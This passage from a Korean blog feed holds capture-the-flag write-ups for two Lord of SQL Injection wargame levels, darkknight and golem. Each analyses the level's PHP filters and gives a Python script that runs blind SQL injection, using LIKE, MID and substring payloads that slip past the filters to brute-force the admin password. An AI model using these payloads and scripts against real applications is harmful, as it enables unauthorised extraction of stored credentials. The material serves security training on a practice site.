re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-12-darkknight/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-12-darkknight/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-08-26T10:38:12.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.11 Golem</title>
    <link href="https://www.jslee.me/2019/08/22/los-write-up-11-golem/"/>
    <id>https://www.jslee.me/2019/08/22/los-write-up-11-golem/</id>
    <published>2019-08-22T12:16:21.000Z</published>
    <updated>2019-08-23T01:33:54.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 11번 golem 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>and</code>, <code>or</code>, <code>substr(</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>4번 orc 문제같은 경우 실제 <code>pw</code>값을 알아내야 한다. 이때 화면에 <code>Hello admin</code>이라는 문자열이 출력되었는지 안 되었는지 여부에 따라 조작한 SQL문의 조건절이 참인지 거짓인지 알아낼 수 있다.</p><p>이처럼 SQL Injection이 가능하고 조작한 SQL문의 조건절이 참인지 거짓인지를 구분할 수 있는 경우 원하는 데이터를 하나씩 알아낼 수 있는데, 이를 Blind SQL Injection 이라고 한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>golem 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and|substr\(|=/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"golem"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and|substr\(|=/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>or</code>, <code>and</code>, <code>substr(</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"golem"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>SUBSTRING</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="</span></span><br><span class="line">    data = <span class="string">"' || id LIKE 'admin' &amp;&amp; length(pw) LIKE '&#123;&#125;'#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="</span></span><br><span class="line">        data = <span class="string">"' || id LIKE 'admin' &amp;&amp; substring(pw, 1, &#123;&#125;) LIKE '&#123;&#125;'#"</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, substr( 을 substring(, = 을 LIKE 로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>88e3137f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=88e3137f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

